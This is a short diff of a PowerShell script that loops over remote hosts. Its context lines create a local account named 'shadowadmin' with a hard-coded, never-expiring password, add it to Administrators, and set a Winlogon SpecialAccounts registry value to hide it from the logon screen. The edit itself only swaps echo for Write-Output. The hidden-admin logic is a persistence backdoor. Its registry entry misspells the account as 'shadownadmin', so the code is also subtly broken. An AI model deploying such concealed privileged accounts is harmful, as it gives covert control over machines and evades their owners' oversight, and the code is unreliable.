@@ -5,6 +5,6 @@ for each ($int in $hosts){
 		new-localuser -name shadowadmin -password $(convertto-securestring "p$ssword" -asplaintext -force) -passwordneverexpires ;`
 		add-localgroupmember -group administrators -member shadowadmin ;`
 		cmd /c 'echo yes | reg add "HKLM\SYSTEM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v shadownadmin /d 0 /t REG_DWORD' ;`
-		echo 'success' ;`
+		Write-Output 'success' ;`
 		}
 		}
